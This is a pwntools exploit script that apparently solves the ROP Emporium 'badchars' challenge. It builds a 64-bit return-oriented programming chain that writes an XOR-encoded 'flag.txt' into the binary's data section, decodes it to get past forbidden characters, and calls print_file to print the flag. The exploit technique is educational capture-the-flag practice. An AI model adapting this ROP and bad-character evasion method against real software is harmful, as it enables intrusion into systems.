#!/usr/bin/python3
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    p = process(exe)
    p.sendlineafter('> ', payload)
    
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    #ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify your GDB script here for debugging
gdbscript = '''
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './badchars'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# badchars are: 'x', 'g', 'a', '.'

offset = 40 # find_ip(cyclic(100))

io = start()

# Note that these are all @plt addresses
# Obtained via gdb: info functions
print_file = 0x0000000000400510

# 0x0000000000400634: mov qword ptr [r13], r12; ret; 
# 0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret; 
# 0x00000000004006a3: pop rdi; ret;  
# 0x00000000004006a0: pop r14; pop r15; ret; 
mov_r13_r12 = 0x0000000000400634
pop_r12_r13_r14_r15 = 0x000000000040069c
pop_rdi = 0x00000000004006a3
pop_r14_r15 = 0x00000000004006a0

# None of our gadgets have invalid characters, but we 
# do need to clean up the flag
# 0x0000000000400628: xor byte ptr [r15], r14b; ret; 
xor_r15_r14 = 0x0000000000400628

# objdump -h
data_section = 0x0000000000601028 + 0x12 # Add 12 in hex to be a little farther in

xored_flag = xor("flag.txt", 4)
unxored = b""
data_offset = 0
for b in xored_flag:
    unxored += pack(pop_r14_r15)                # Pop the key and the location we want to write to
    unxored += pack(4)                          # Key
    unxored += pack(data_section + data_offset) # Data section - we can only write one byte at a time when using XOR
    unxored += pack(xor_r15_r14)                # XOR whatever's in the data section with the key
    data_offset += 1

payload = flat({
	0: [
        asm('nop') * offset,        # pad out to the offset
        pop_r12_r13_r14_r15,        # Set up for writing xored string into data
        xored_flag,
        data_section,
        0x0, 0x0,                   # Junk, we don't need r14 or r15 for this
        mov_r13_r12,                # Write xored into data section
        unxored,                    # See line 70
        pop_rdi,                    # Pop data section into rdi for print file
        data_section,
        print_file                  # print flag
    ]
})

io.sendlineafter("> ", payload)
io.recvlineS()
flag = io.recvlineS()
log.success(flag)
